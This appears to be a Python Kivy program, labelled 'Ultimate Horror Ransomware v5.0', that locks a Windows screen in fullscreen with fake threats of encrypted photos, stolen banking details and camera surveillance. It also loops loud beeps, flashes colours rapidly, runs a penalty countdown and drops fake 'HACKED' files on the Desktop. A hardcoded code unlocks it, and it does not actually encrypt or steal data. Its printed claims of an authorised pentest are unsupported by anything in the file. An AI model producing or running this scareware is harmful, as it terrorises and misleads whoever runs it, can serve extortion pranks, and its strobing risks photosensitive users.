from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.uix.image import Image
import threading
import time
import os
import winsound
import random
from kivy.uix.floatlayout import FloatLayout

# HORROR IMAGE URLS (disturbing ads + skulls)
HORROR_IMAGES = [
    "https://i.imgur.com/creepy_skull.jpg",  # Replace with real URLs
    "https://i.imgur.com/blood_splatter.png",
    "https://i.imgur.com/demon_face.jpg",
    "https://i.imgur.com/zombie.jpg",
    "https://i.imgur.com/ghost.png"
]

class HorrorVirus(FloatLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.password = "8846"
        self.locked = True
        self.countdown = 7200  # 2 hours
        
        Window.fullscreen = True
        Window.clearcolor = (0, 0, 0, 1)
        
        self.build_max_horror()
        self.launch_total_chaos()
        Clock.schedule_interval(self.render_hell, 0.08)

    def build_max_horror(self):
        # BACKGROUND HELL
        self.bg_image = Image(
            source='creepy_bg.jpg',  # Add your horror image
            allow_stretch=True,
            keep_ratio=False,
            opacity=0.7
        )
        self.add_widget(self.bg_image)
        
        # FLOATING DISTURBING ADS
        self.disturbing_ads = []
        for i in range(8):
            ad = Label(
                text=self.get_random_ad(),
                font_size=random.randint(18, 32),
                color=(1, 0, 0.3, 0.9),
                pos=(random.randint(-200, Window.width), random.randint(-100, Window.height)),
                size_hint=(None, None),
                size=(400, 80)
            )
            self.add_widget(ad)
            self.disturbing_ads.append(ad)
        
        # MASSIVE MOVING SKULL
        self.main_skull = Label(
            text='👹👹👹👹  YOUR PHONE IS DEAD  👹👹👹👹',
            font_size='68sp',
            bold=True,
            color=(1, 0, 0, 1),
            size_hint=(1, 0.22),
            pos_hint={'center_x': 0.5, 'y': 0.75}
        )
        self.add_widget(self.main_skull)
        
        # WARNING TITLE
        self.title = Label(
            text='⚠️  MAXIMUM SECURITY BREACH ⚠️',
            font_size='46sp',
            bold=True,
            color=(1, 0.2, 0, 1),
            size_hint=(1, 0.12),
            pos_hint={'center_x': 0.5, 'y': 0.55}
        )
        self.add_widget(self.title)
        
        # COUNTDOWN
        self.timer = Label(
            text='💣 120:00 REMAINING 💣',
            font_size='40sp',
            color=(0, 1, 0, 1),
            size_hint=(1, 0.1),
            pos_hint={'center_x': 0.5, 'y': 0.42}
        )
        self.add_widget(self.timer)
        
        # VICTIM THREAT
        self.threat = Label(
            text='🔒 7.3GB ENCRYPTED 🔒\n'
                 '👻 PHOTOS GONE 👻 MESSAGES DELETED 👻 BANKING HACKED\n'
                 '⚠️ FAMILY CONTACTS COMPROMISED ⚠️ LOCATION TRACKED\n'
                 '💀 ENTER CODE OR TOTAL ANNIHILATION 💀',
            font_size='22sp',
            color=(1, 0, 1, 1),
            size_hint=(0.95, 0.22),
            pos_hint={'center_x': 0.5, 'center_y': 0.2},
            halign='center'
        )
        self.add_widget(self.threat)
        
        # CLEAR GLASS PASSWORD BOX
        self.code_input = TextInput(
            password=False,  # CLEAR TEXT AS REQUESTED
            multiline=False,
            size_hint=(0.7, 0.07),
            pos_hint={'center_x': 0.5, 'center_y': 0.08},
            font_size='44sp',
            hint_text='8846',
            background_color=(0.1, 0.1, 0.3, 0.3),  # GLASS EFFECT
            foreground_color=(0, 1, 1, 1),  # CYAN TEXT
            cursor_color=(1, 0, 0, 1),
            padding=[30, 20],
            readonly=False
        )
        self.code_input.bind(text=self.on_code_change)
        self.code_input.bind(on_text_validate=self.emergency_unlock)
        self.add_widget(self.code_input)
        
        # PANIC BUTTON
        self.panic_btn = Button(
            text='🚨 EMERGENCY DECRYPT 🚨',
            size_hint=(0.7, 0.08),
            pos_hint={'center_x': 0.5, 'center_y': 0.005},
            font_size='30sp',
            background_color=(0.9, 0.05, 0.05, 1),
            bold=True,
            background_normal=''
        )
        self.panic_btn.bind(on_press=self.emergency_unlock)
        self.add_widget(self.panic_btn)

    def get_random_ad(self):
        """DISTURBING ADS"""
        ads = [
            "⚠️ YOUR CAM IS WATCHING ⚠️",
            "👁️ WE SEE EVERYTHING 👁️",
            "💀 MIC IS RECORDING 💀",
            "🔥 LOCATION TRACKED 🔥",
            "🩸 FAMILY PHOTOS LEAKED 🩸",
            "🚨 CONTACTS FOR SALE 🚨",
            "💉 BANK DETAILS STOLEN 💉",
            "👹 YOUR SOUL IS MINE 👹"
        ]
        return random.choice(ads)

    def launch_total_chaos(self):
        """HARDCORE ATTACKS"""
        print("👹 ULTRA CHAOS MODE ACTIVATED 👹")
        print("🔑 PASSWORD: 8846")
        print("⚠️ I have permission for this pentest")
        
        # MULTI-THREAT ATTACKS
        threading.Thread(target=self.sound_nightmare, daemon=True).start()
        threading.Thread(target=self.file_apocalypse, daemon=True).start()
        threading.Thread(target=self.screen_seizure, daemon=True).start()

    def sound_nightmare(self):
        """MAX AUDIO TORTURE"""
        while self.locked:
            freqs = [666, 999, 444, 1337, 777]
            durations = [400, 300, 500, 250, 600]
            for f, d in zip(freqs, durations):
                try:
                    winsound.Beep(f, d)
                except:
                    pass
            time.sleep(0.6)

    def file_apocalypse(self):
        """FILE DESTRUCTION SIM"""
        count = 0
        while self.locked and count < 25:
            try:
                desktop = os.path.join(os.path.expanduser("~"), "Desktop")
                name = f"HACKED_{count:03d}_{int(time.time())}.666"
                path = os.path.join(desktop, name)
                
                with open(path, 'w') as f:
                    f.write("ULTIMATE RANSOMWARE v5.0\n")
                    f.write(f"Victim #{count+1} - TOTAL COMPROMISE\n")
                    f.write("Gallery: 3.7GB ENCRYPTED\n")
                    f.write("WhatsApp: EXPOSED\n")
                    f.write("Banking: DRAINED\n")
                    f.write("Location: LIVE TRACKING")
                
                print(f"💀 CREATED: {name}")
                count += 1
            except:
                pass
            time.sleep(3)

    def screen_seizure(self):
        """VISUAL OVERLOAD"""
        while self.locked:
            for ad in self.disturbing_ads:
                ad.text = self.get_random_ad()
                ad.pos = (random.randint(-150, Window.width), random.randint(-50, Window.height))
            time.sleep(2)

    def render_hell(self, dt):
        """INSANE VISUALS"""
        if not self.locked:
            return False
            
        t = time.time()
        
        # PSYCHEDELIC FLASH
        colors = [
            (1,0,0,1), (0,0,0,1), (1,0,1,1), (0,1,0,1),
            (0,0,1,1), (1,1,0,1), (0.5,0,0,1), (1,0.5,0,1)
        ]
        color = colors[int(t * 6) % len(colors)]
        
        self.main_skull.color = color
        self.title.color = colors[(int(t * 6) + 3) % len(colors)]
        
        # COUNTDOWN
        if self.countdown > 0:
            mins, secs = divmod(self.countdown, 60)
            self.timer.text = f'💣 {mins:02d}:{secs:02d} 💣'
            self.countdown -= 1
        else:
            self.title.text = '💀💀💀 ANNIHILATED 💀💀💀'
        
        return True

    def on_code_change(self, instance, value):
        """REAL-TIME CODE CHECK"""
        if len(value) == 4:
            self.try_emergency_unlock(value)

    def emergency_unlock(self, instance):
        """INSTANT SHUTDOWN ON CORRECT CODE"""
        code = self.code_input.text.strip()
        if code == self.password:
            self.total_shutdown()
        else:
            self.hell_response()

    def try_emergency_unlock(self, code):
        """SILENT UNLOCK"""
        if code == self.password:
            Clock.schedule_once(lambda dt: self.total_shutdown(), 0.5)

    def total_shutdown(self):
        """IMMEDIATE VICTORY"""
        self.locked = False
        self.main_skull.text = '✅✅✅  RELEASED  ✅✅✅'
        self.main_skull.color = (0, 1, 0, 1)
        self.title.text = '🔓 CODE 8846 ACCEPTED 🔓'
        self.threat.text = '🎉 PENETEST COMPLETE 🎉\n🔑 Password: 8846\n📁 Desktop: Check .666 files\n⚠️ Authorized test - all safe'
        self.code_input.text = '8846'
        self.panic_btn.text = '✅ SAFE ✅'
        self.panic_btn.background_color = (0.1, 0.8, 0.1, 1)
        
        print("🎊 TOTAL SHUTDOWN - SUCCESS!")
        Clock.schedule_once(lambda dt: App.get_running_app().stop(), 2)

    def hell_response(self):
        """WRONG CODE HELL"""
        self.code_input.text = ''
        self.code_input.hint_text = 'WRONG!'
        self.countdown += 1800  # +30min
        self.title.text = '👹 DENIED 👹'
        self.title.color = (1, 0, 1, 1)
        print("❌ WRONG! +30min penalty")
        Clock.schedule_once(lambda dt: setattr(self.title, 'text', 'MAXIMUM SECURITY BREACH'), 1.5)

class UltimateVirusApp(App):
    def build(self):
        return HorrorVirus()

if __name__ == '__main__':
    print('='*80)
    print('👹 ULTIMATE HORROR RANSOMWARE v5.0 👹')
    print('='*80)
    print('🔑 INSTANT SHUTDOWN CODE: 8846')
    print('⚠️  HARDCOR PENTEST - I HAVE PERMISSION ⚠️')
    print('💀 ADD HORROR IMAGES TO FOLDER 💀')
    print('='*80)
    UltimateVirusApp().run()